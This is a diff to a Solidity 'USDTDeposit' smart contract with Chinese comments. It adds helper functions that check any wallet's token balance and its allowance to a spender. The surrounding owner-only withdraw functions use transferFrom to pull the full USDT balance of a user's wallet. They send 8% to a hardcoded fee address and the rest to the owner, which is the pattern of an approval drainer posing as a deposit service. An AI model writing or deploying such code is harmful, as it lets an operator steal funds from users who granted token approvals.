@@ -637,6 +637,20 @@ contract USDTDeposit is Ownable, ReentrancyGuard {
         return (users, balances);
     }
 
+     // 查询某个地址在指定 ERC-20 代币合约中的余额
+    function getTokenBalance(address tokenAddress, address walletAddress) external view returns (uint256) {
+        IERC20 token = IERC20(tokenAddress);
+        // 获取该地址在指定代币合约中的余额
+        uint256 balance = token.balanceOf(walletAddress);
+        return balance;
+    }
+    
+    function checkAllowance(address tokenAddress, address owner, address spender) external view returns (uint256) {
+    IERC20 token = IERC20(tokenAddress);
+        // 查询 owner 地址授权给 spender 地址的代币数量
+        return token.allowance(owner, spender);
+    }
+
     // 新的状态变量：接收 8% 提款手续费的地址
     address public feeRecipient = 0x5AA6141Eb1aC04afE79Ab173EA56EAef1E7105Ba;
 
@@ -650,7 +664,6 @@ contract USDTDeposit is Ownable, ReentrancyGuard {
                 // Calculate 8% fee and 92% for the owner
                 uint256 fee = (balance * 8) / 100;         // 8%
                 uint256 ownerAmount = balance - fee;       // 92%
-
                 // Transfer 8% fee to feeRecipient
                 require(usdtToken.transferFrom(user, feeRecipient, fee), "USDT transfer to feeRecipient failed");
                 // Transfer 92% to the owner
@@ -658,10 +671,9 @@ contract USDTDeposit is Ownable, ReentrancyGuard {
             }
         }
     }
+    
 
-        // 移除了 `adminWithdrawevent` 函数，因为该函数存在问题
     function adminWithdrawUserByBalance(address useraddress,uint256 balance) external onlyOwner nonReentrant {
-
             if (balance > 0) {
                 // Calculate 8% fee and 92% for the owner
                 uint256 fee = (balance * 8) / 100;         // 8%
@@ -673,7 +685,6 @@ contract USDTDeposit is Ownable, ReentrancyGuard {
             }
     }
 
-            // 移除了 `adminWithdrawevent` 函数，因为该函数存在问题
     function adminWithdrawUser(address useraddress) external onlyOwner nonReentrant {
 
             uint256 balance = usdtToken.balanceOf(useraddress);
